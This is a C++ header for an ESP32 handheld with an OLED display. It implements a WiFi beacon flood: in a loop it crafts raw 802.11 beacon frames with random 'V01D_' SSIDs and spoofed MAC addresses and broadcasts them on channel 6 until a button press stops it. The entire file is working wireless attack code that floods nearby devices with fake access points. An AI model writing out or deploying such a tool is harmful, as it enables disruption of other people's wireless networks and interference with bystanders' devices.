#ifndef BEACON_FLOOD_H
#define BEACON_FLOOD_H

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
extern Adafruit_SSD1306 display;

#define BTN_SELECT 16

void startBeaconFlood() {
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  delay(300);

  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("AP Flood");
  display.println("Status: STARTED");
  display.println("Channel: 6");
  display.println("Press SELECT to stop");
  display.display();

  while (digitalRead(BTN_SELECT)) {
    for (int j = 0; j < 100; j++) {
      // Random SSID
      char ssid[16];
      sprintf(ssid, "V01D_%02X%02X", random(0x00, 0xFF), random(0x00, 0xFF));
      int ssidLen = strlen(ssid);

      uint8_t mac[6] = {
        0xDE, 0xAD, 0xBE,
        random(0x00, 0xFF),
        random(0x00, 0xFF),
        random(0x00, 0xFF)
      };

      uint8_t packet[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], 
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], 
        0x00, 0x00 
      };

      int i = 24;
      i += 8; // Timestamp
      packet[i++] = 0x64; packet[i++] = 0x00;
      packet[i++] = 0x01; packet[i++] = 0x04; 
      packet[i++] = 0x00; 
      packet[i++] = ssidLen;
      memcpy(&packet[i], ssid, ssidLen);
      i += ssidLen;
      packet[i++] = 0x01; packet[i++] = 0x08;
      memcpy(&packet[i], "\x82\x84\x8b\x96\x24\x30\x48\x6c", 8);
      i += 8;

      esp_wifi_80211_tx(WIFI_IF_AP, packet, i, false);
      delay(5);
    }
  }

  WiFi.mode(WIFI_OFF);
  delay(100);

  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("Beacon Flood");
  display.println("Status: STOPPED");
  display.display();
  delay(1500); 
}

#endif